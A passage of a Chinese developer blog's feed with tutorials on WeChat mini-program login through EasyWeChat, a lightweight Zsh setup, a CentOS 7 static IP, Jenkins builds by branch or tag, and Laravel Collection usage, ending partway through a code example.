        <content type="html"><![CDATA[<p>通常对接小程序，为了加快开发速度，会直接使用 <a href="https://github.com/overtrue/wechat" target="_blank" rel="noopener">EasyWeChat</a> 这个扩展包进行开发，EasyWeChat 已经封装好了微信相关的接口，使用起来非常方便。</p><a id="more"></a><h2 id="小程序登录流程"><a href="#小程序登录流程" class="headerlink" title="小程序登录流程"></a>小程序登录流程</h2><p>下图是微信官方提供的时序图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210511161052.png" alt=""></p><p>整理成流程，大概就是：</p><ol><li>小程序调用 <code>wx.login()</code> 接口获取<strong>临时登录凭证（code）</strong>，这一步用户是无感知的，无需用户授权；</li><li>小程序提交 <code>code</code> 到 开发者服务器；</li><li>开发者服务器通过 <code>appid</code>、<code>appsecret</code> 和 <code>code</code> 请求微信接口，换取用户的 <code>session_key</code> 和 <code>openid</code>；</li><li>开发者服务器根据 <code>openid</code> 查找到对应的用户，存入 <code>session_key</code>，然后为该用户生成 access_token （JWT）返回给小程序。</li><li>有了 <code>access_token</code> 小程序就可以调用任意接口了。</li></ol><p>注意这里的 <code>session_key</code> 是一个比较特殊的设计，是用户的 会话密钥，需要存储在服务器中，调用获取用户信息、获取微信用户绑定的手机号等微信接口时，需要用这个 会话密钥 才能解密获取相关数据。每次调用 <code>wx.login()</code> 之后，微信都会自动生成新的 <code>session_key</code> ，导致之前的 <code>session_key</code> 失效，所以在必要的时候再去调用 <code>wx.login()</code>，而且还要及时保存 <code>session_key</code> 到服务器，以备后续使用。</p><p>此段流程整理来自Laravel 社区的<a href="https://learnku.com/courses/laravel-weapp/2.0/small-program-login-detailed-solution/4933#0dfb2b" target="_blank" rel="noopener">《L04 Laravel教程-微信小程序从零到发布》</a>。</p><h2 id="获取OpenID和SessionKey"><a href="#获取OpenID和SessionKey" class="headerlink" title="获取OpenID和SessionKey"></a>获取OpenID和SessionKey</h2><p>清楚了小程序的登录流程之后，可以动手来获取<code>code</code>了。</p><h3 id="创建小程序"><a href="#创建小程序" class="headerlink" title="创建小程序"></a>创建小程序</h3><p>这里建议使用最新版本的微信开发者工具，以免出现一些不必要的问题。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210511163706.png" alt=""></p><p>填入AppID，点击新建。</p><p>初始化的小程序无需做任何更改，只需要在<code>wx.login()</code> 下面增加一行<code>console.log(res)</code> 将结果打印在控制台中，然后重新编译，即可看到控制台中输出了 <code>code</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210512211535.png" alt=""></p><p>拿到<code>code</code> 之后，就可以获取<code>OpenID</code>、<code>SessionKey</code>了。</p><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><p>为了方便调试，这里直接在 Laravel 的Tinker 中进行测试，以下代码逐行粘贴在 tinker 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">EasyWeChat</span>\<span class="title">Factory</span>;</span><br><span class="line">$config = [</span><br><span class="line">    <span class="string">'app_id'</span> =&gt; <span class="string">'wx2b41f13e5e*****'</span>,</span><br><span class="line">    <span class="string">'secret'</span> =&gt; <span class="string">'92474ce5be69c4fb25392d6cfb******'</span>,</span><br><span class="line">    <span class="string">'response_type'</span> =&gt; <span class="string">'array'</span>,</span><br><span class="line">    <span class="string">'log'</span> =&gt; [</span><br><span class="line">        <span class="string">'level'</span> =&gt; <span class="string">'debug'</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br><span class="line">$app = Factory::miniProgram($config);</span><br><span class="line">$app-&gt;auth-&gt;session(<span class="string">'CODE'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常输出如下：</span></span><br><span class="line">[</span><br><span class="line">     <span class="string">"session_key"</span> =&gt; <span class="string">"nFpZ0gfHKOtYQ878enM*****"</span>,</span><br><span class="line">     <span class="string">"openid"</span> =&gt; <span class="string">"oN7jq1ejz5KQX5JtEiBsL*****"</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>其中<code>app_id</code> 和<code>secret</code> 需要开发者通过微信开发平台自行获取：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210510234405.png" alt=""></p><p>不填或者填入错误的<code>app_id</code> 和 <code>secret</code> 都会导致获取OpenID异常。</p><p>如果遇到异常，可以对照微信官方文档——<a href="https://developers.weixin.qq.com/doc/offiaccount/Getting_Started/Global_Return_Code.html" target="_blank" rel="noopener">全局返回码</a>进行排查分析。</p><h3 id="登录凭证校验"><a href="#登录凭证校验" class="headerlink" title="登录凭证校验"></a>登录凭证校验</h3><p>拿到OpenID及 SessionKey 之后，下一步就可以进行解密了，这一步也是通过<code>EasyWeCaht</code> 来完成。</p><p>根据前面的时序图，可以得知，登录凭证校验需要用到以下参数：</p><ul><li>appid：iv</li><li>appsecret：encryptedData</li><li>code：上面拿到的SessionKey</li></ul><p>最后一个都好理解，可是前面两个分别是什么鬼？</p><p>不着急，先打开微信开发者工具，在<code>app.js</code> 中，加入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line">App(&#123;</span><br><span class="line">  onLaunch() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户信息</span></span><br><span class="line">    wx.getSetting(&#123;</span><br><span class="line">      success: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.authSetting[<span class="string">'scope.userInfo'</span>]) &#123;</span><br><span class="line">          <span class="comment">// 已经授权，可以直接调用 getUserInfo 获取头像昵称，不会弹框</span></span><br><span class="line">          wx.getUserInfo(&#123;</span><br><span class="line">            success: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="built_in">console</span>.log(res)  </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  globalData: &#123;</span><br><span class="line">    userInfo: <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>保存之后，再次编译，查看控制台输出：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210513151643.png" alt=""></p><p>这两个就是我们需要的数据了，拿到之后，再次打开<code>Tinker</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$app-&gt;encryptor-&gt;decryptData(&quot;SessionKey&quot;, &quot;iv&quot;, &quot;encryptedData&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210513151926.png" alt=""></p><p>正常情况下，返回结果会包含当前登录用户的个人信息，我这里用的是测试号，因此并没有譬如手机号这类字段。</p><p>至此，小程序登录与微信接口服务的交互就告一段落了，获取到用户身份之后的逻辑就不用多说了。</p><p>上面小程序端的代码只是演示如何拿到需要的参数，实际开发并不建议用此方式直接写在<code>app.js</code> 中。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何配置一个简洁高效的 Zsh</title>
      <link href="/how-to-configure-a-simple-and-efficient-zsh/"/>
      <url>/how-to-configure-a-simple-and-efficient-zsh/</url>
      
        <content type="html"><![CDATA[<p>Shell 是类 Unix 系统中超级好用的工具，而 Zsh 是 Shell 中的佼佼者，但是现在网上一搜索 Zsh 的配置方案，遍地都是的互相复制粘贴的<code>oh-my-zsh</code> 配置方案。事实上 <code>oh-my-zsh</code> 并不好用，严重拖慢了 Zsh 的速度，下面分享一个简洁高效的Zsh 配置方案。</p><a id="more"></a><h3 id="安装Zsh"><a href="#安装Zsh" class="headerlink" title="安装Zsh"></a>安装Zsh</h3><p>这里直接从发行版的源中进行安装，简单、高效：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure><h3 id="安装插件及主题"><a href="#安装插件及主题" class="headerlink" title="安装插件及主题"></a>安装插件及主题</h3><p>两个插件一个主题：</p><ul><li><code>zsh-autosuggestions</code>：这个是自动建议插件，能够自动提示你需要的命令。</li><li><code>zsh-syntax-highlighting</code>：这个是代码高亮插件，能够使你的命令行各个命令清晰明了。</li><li><code>zsh-theme-powerlevel10k</code> 这个主题提供漂亮的提示符，可以显示当前路径、时间、命令执行成功与否，还能够支持 git 分支显示等等。</li></ul><p>一键安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k</span><br></pre></td></tr></table></figure><p>不出意外的话，会提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E: Unable to locate package zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>这是因为软件源中并没有<code>zsh-autosuggestions</code> 这个package，所以需要手动添加软件包。</p><p>这里可以直接进入<a href="https://software.opensuse.org/" target="_blank" rel="noopener">opensuse</a> 进行搜索，需要的软件包。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084534.png" alt=""></p><p>找到对应的发行版，点击Export Download：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084558.png" alt=""></p><p>这里提供两种方式供我们选择：</p><ol><li>添加软件源并手动安装</li><li>直接抓取二进制软件包</li></ol><p>直接给结论，第二种方式更简单些，直接下载.deb文件之后，就可以安装了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084624.png" alt=""></p><p>选择对应的操作系统以及版本，右键拷贝链接地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">  wget https://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/amd64/zsh-autosuggestions_0.5.0+1.1_amd64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i zsh-autosuggestions_0.5.0+1.1_amd64.deb</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084643.png" alt=""></p><p>再次执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k</span><br></pre></td></tr></table></figure><p>至此，插件和主题就安装完成了。</p><h3 id="更改默认Shell"><a href="#更改默认Shell" class="headerlink" title="更改默认Shell"></a>更改默认Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chsh -s &#x2F;usr&#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>注销并重新登录，再次登录成功时，默认启用了zsh。</p><h3 id="配置插件和主题"><a href="#配置插件和主题" class="headerlink" title="配置插件和主题"></a>配置插件和主题</h3><p>第一次进入 Zsh 会自动出现一个配置界面，这个界面可以根据需要自定义 Zsh。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084659.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084717.png" alt=""></p><p>配置界面中各个菜单代表的意思分别是：</p><p>1：设置命令历史记录相关的选项<br>2：设置命令补全系统<br>3：设置热建<br>4：选择各种常见的选项，只需要选择“On”或者“Off”<br>0：退出，并使用空白（默认）配置<br>a：终止设置并退出<br>q：退出</p><h3 id="启用插件和主题"><a href="#启用插件和主题" class="headerlink" title="启用插件和主题"></a>启用插件和主题</h3><p>Zsh 的配置文件是 <code>~/.zshrc</code> 文件，这个文件在你的用户目录下 <code>~/</code>。删掉了这个文件，再次进入 Zsh时，会再次进入 Zsh 的配置界面。</p><p>将以下代码加入到 <code>~/.zshrc</code> 文件中，以启用插件和主题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;usr&#x2F;share&#x2F;powerlevel9k&#x2F;powerlevel9k.zsh-theme</span><br><span class="line">source &#x2F;usr&#x2F;share&#x2F;zsh-autosuggestions&#x2F;zsh-autosuggestions.zsh</span><br><span class="line">source &#x2F;usr&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh</span><br></pre></td></tr></table></figure><p>再次注销并登录，即可看到新的终端界面：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084734.png" alt=""></p><h3 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h3><ul><li><a href="https://linux.cn/article-13030-1.html" target="_blank" rel="noopener">配置一个简洁高效的 Zsh</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos 7 设置静态 IP</title>
      <link href="/centos-7-set-static-ip/"/>
      <url>/centos-7-set-static-ip/</url>
      
        <content type="html"><![CDATA[<p>通常本地的虚拟机，默认都是动态IP，这就意味着，每次重启机器，IP 地址都会发生变化，虽然不影响正常使用，但是每次重启都发生变化，这就导致还需要看一眼，才知道当前新的IP 是多少，那么有没有什么办法可以永久设置成静态IP 呢，答案是有的。</p><a id="more"></a><p>系统版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;redhat-release </span><br><span class="line">CentOS Linux release 7.8.2003 (Core)</span><br></pre></td></tr></table></figure><p>查看当前网卡的名称：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210507115101.png" alt=""></p><blockquote><p>一台电脑可能有多个网卡，如何判断哪一个是当前正在使用的？</p></blockquote><p>就看哪个网卡的IP 刚好是该机器当前的IP。</p><p>比如在上面的例子中，机器当前的IP 是<code>192.168.1.100</code>，那么只要确定某个网卡的IP 也是 <code>192.168.1.100</code>，那这个网卡就是我们要找的了。</p><p>编辑对应的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts</span><br><span class="line">$ vim ifcfg-网卡名称</span><br></pre></td></tr></table></figure><p>设置静态IP 配置文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TYPE="Ethernet"</span><br><span class="line">PROXY_METHOD="none"</span><br><span class="line">BROWSER_ONLY="no"</span><br><span class="line">BOOTPROTO="static"         # 使用静态IP地址，默认为动态，即dhcp</span><br><span class="line">IPADDR="192.168.241.100"   # 设置的静态IP地址</span><br><span class="line">NETMASK="255.255.255.0"    # 子网掩码</span><br><span class="line">GATEWAY="192.168.1.1"      # 网关地址</span><br><span class="line">DNS1="114.114.114.114"     # DNS服务器</span><br><span class="line">DEFROUTE="yes"</span><br><span class="line"></span><br><span class="line">IPV4_FAILURE_FATAL="no"</span><br><span class="line">IPV6INIT="yes"</span><br><span class="line">IPV6_AUTOCONF="yes"</span><br><span class="line">IPV6_DEFROUTE="yes"</span><br><span class="line">IPV6_FAILURE_FATAL="no"</span><br><span class="line">IPV6_ADDR_GEN_MODE="stable-privacy"</span><br><span class="line"></span><br><span class="line">NAME="ens33"</span><br><span class="line">UUID="95b614cd-79b0-4755-b08d-99f1cca7271b"</span><br><span class="line">DEVICE="ens33"</span><br><span class="line"></span><br><span class="line">ONBOOT="yes"               #是否开机启用</span><br></pre></td></tr></table></figure><p>重启网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service network restart</span></span><br></pre></td></tr></table></figure><p>如果没有生效，可以尝试编辑<code>/etc/resolv.conf</code>，加入以下配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver 114.114.114.114  # 和上面的DNS 服务器保持一致</span><br></pre></td></tr></table></figure><p>再次重启网络。</p><p>需要注意的是：这种配置是永久生效的，即使下次重启电脑，IP 地址也不会发生变化。</p><p>至此，就完成了设置静态IP 的全部配置。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何利用Jenkins 实现标签或者分支选择性构建</title>
      <link href="/how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/"/>
      <url>/how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/</url>
      
        <content type="html"><![CDATA[<p>如题。</p><a id="more"></a><p>需求可以简单描述为：在Jenkins 中通过手动的方式自主选择标签或者分支进行构建。而不是通过 Push 事件进行自动触发。</p><p>在正式开始之前，需要先安装 <code>Git Parameter</code> 插件。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506205636.png" alt=""></p><p>在可选插件中搜索<code>Git Parameter</code>，进行安装。</p><p>正常安装完成，可以看到如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506205903.png" alt=""></p><p>创建一个自由风格的软件项目：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506205922.png" alt=""></p><p>选择参数化构建过程，参数类型选择分支或标签：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506210012.png" alt=""></p><p>源码管理选择Git，填上项目地址，如果是私有项目，需要添加 Credential：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506210049.png" alt=""></p><p>最后点击保存即可。</p><p>点击<code>Build with Parameters</code>，可以看到所有标签和分支，手动选择不同的分支和标签即可进行构建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506210303.png" alt=""></p><p>可以看到核心的步骤其实只有两步，如果还有其他需求，比如构建完成之后，执行某个脚本，也是可以实现的，</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.huaweicloud.com/articles/0591d64c9060a6484280fe1d55d251dc.html" target="_blank" rel="noopener">Jenkins教程（三）添加凭据与流水线拉取Git代码</a></li><li><a href="https://www.jianshu.com/p/927a1599f7a0" target="_blank" rel="noopener">Jenkins参数化构建-插件:Git Parameter</a></li><li><a href="http://www.mydlq.club/article/45/" target="_blank" rel="noopener">Jenkins 中使用 Git Parameter 插件动态获取 Git 的分支</a></li><li><a href="https://www.cnblogs.com/zt007/p/9472524.html" target="_blank" rel="noopener">Jenkins：使用Git Parameter插件实现tag或分支的选择性构建</a></li><li><a href="https://testerhome.com/articles/17383" target="_blank" rel="noopener">利用 jenkins 达到提 tag 自动打包</a></li><li><a href="https://www.cnblogs.com/tugenhua0707/p/11949644.html" target="_blank" rel="noopener">Jenkins 实现前端自动打包,自动部署代码及邮件提醒功能</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Jenkins </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jenkins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Collection 实际使用</title>
      <link href="/the-actual-use-of-collection-in-laravel/"/>
      <url>/the-actual-use-of-collection-in-laravel/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来整理Collection 在Laravel 的实际应用场景。</p><a id="more"></a><h2 id="求和"><a href="#求和" class="headerlink" title="求和"></a>求和</h2><blockquote><p>需求：遍历$orders 数组，求price 的和。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入package</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$orders = [[</span><br><span class="line">    <span class="string">'id'</span>            =&gt;      <span class="number">1</span>,</span><br><span class="line">    <span class="string">'user_id'</span>       =&gt;      <span class="number">1</span>,</span><br><span class="line">    <span class="string">'number'</span>        =&gt;      <span class="string">'13908080808'</span>,</span><br><span class="line">    <span class="string">'status'</span>        =&gt;      <span class="number">0</span>,</span><br><span class="line">    <span class="string">'fee'</span>           =&gt;      <span class="number">10</span>,</span><br><span class="line">    <span class="string">'discount'</span>      =&gt;      <span class="number">44</span>,</span><br><span class="line">    <span class="string">'order_products'</span>=&gt; [</span><br><span class="line">        [<span class="string">'order_id'</span>=&gt;<span class="number">1</span>,<span class="string">'product_id'</span>=&gt;<span class="number">1</span>,<span class="string">'param'</span>=&gt;<span class="string">'6寸'</span>,<span class="string">'price'</span>=&gt;<span class="number">555.00</span>,<span class="string">'product'</span>=&gt;[<span class="string">'id'</span>=&gt;<span class="number">1</span>,<span class="string">'name'</span>=&gt;<span class="string">'蛋糕名称'</span>,<span class="string">'images'</span>=&gt;[]]],</span><br><span class="line">        [<span class="string">'order_id'</span>=&gt;<span class="number">1</span>,<span class="string">'product_id'</span>=&gt;<span class="number">1</span>,<span class="string">'param'</span>=&gt;<span class="string">'7寸'</span>,<span class="string">'price'</span>=&gt;<span class="number">333.00</span>,<span class="string">'product'</span>=&gt;[<span class="string">'id'</span>=&gt;<span class="number">1</span>,<span class="string">'name'</span>=&gt;<span class="string">'蛋糕名称'</span>,<span class="string">'images'</span>=&gt;[]]],</span><br><span class="line">    ],</span><br><span class="line">]];</span><br></pre></td></tr></table></figure><ol><li><p>使用传统的foreach 方式进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($orders <span class="keyword">as</span> $order) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($order[<span class="string">'order_products'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $sum += $item[<span class="string">'price'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map、flatten、sum：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sum = collect($orders)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'order_products'</span>];</span><br><span class="line">&#125;)-&gt;flatten(<span class="number">1</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'price'</span>];</span><br><span class="line">&#125;)-&gt;sum();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure></li></ol><p>map：遍历集合，返回一个新的集合。<br>flatten：将多维数组转换为一维。<br>sum：返回数组的和。</p><ol start="3"><li>使用集合的flatMap、pluck、sum：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sum = collect($orders)-&gt;flatMap(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'order_products'</span>];</span><br><span class="line">&#125;)-&gt;pluck(<span class="string">'price'</span>)-&gt;sum();</span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure></li></ol><p>flatMap：和<code>map</code> 类似，不过区别在于<code>flatMap</code> 可以直接使用返回的新集合。</p><ol start="4"><li>使用集合的flatMap、sum：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sum = collect($orders)-&gt;flatMap(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'order_products'</span>];</span><br><span class="line">&#125;)-&gt;sum(<span class="string">'price'</span>);</span><br></pre></td></tr></table></figure></li></ol><p>sum：可以接收一个列名作为参数进行求和。</p><h2 id="格式化数据"><a href="#格式化数据" class="headerlink" title="格式化数据"></a>格式化数据</h2><blockquote><p>需求：将如下结构的数组，格式化成下面的新数组。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 带格式化数组</span></span><br><span class="line">$gates = [</span><br><span class="line">    <span class="string">'BaiYun_A_A17'</span>,</span><br><span class="line">    <span class="string">'BeiJing_J7'</span>,</span><br><span class="line">    <span class="string">'ShuangLiu_K203'</span>,</span><br><span class="line">    <span class="string">'HongQiao_A157'</span>,</span><br><span class="line">    <span class="string">'A2'</span>,</span><br><span class="line">    <span class="string">'BaiYun_B_B230'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新数组</span></span><br><span class="line">$boards = [</span><br><span class="line">    <span class="string">'A17'</span>,</span><br><span class="line">    <span class="string">'J7'</span>,</span><br><span class="line">    <span class="string">'K203'</span>,</span><br><span class="line">    <span class="string">'A157'</span>,</span><br><span class="line">    <span class="string">'A2'</span>,</span><br><span class="line">    <span class="string">'B230'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li><p>使用foreach 进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$res = [];</span><br><span class="line"><span class="keyword">foreach</span>($gates <span class="keyword">as</span> $key =&gt; $gate) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos($gate, <span class="string">'_'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $res[$key] = $gate;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $offset = strrpos($gate, <span class="string">'_'</span>) + <span class="number">1</span>;</span><br><span class="line">        $res[$key] = mb_substr($gate , $offset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 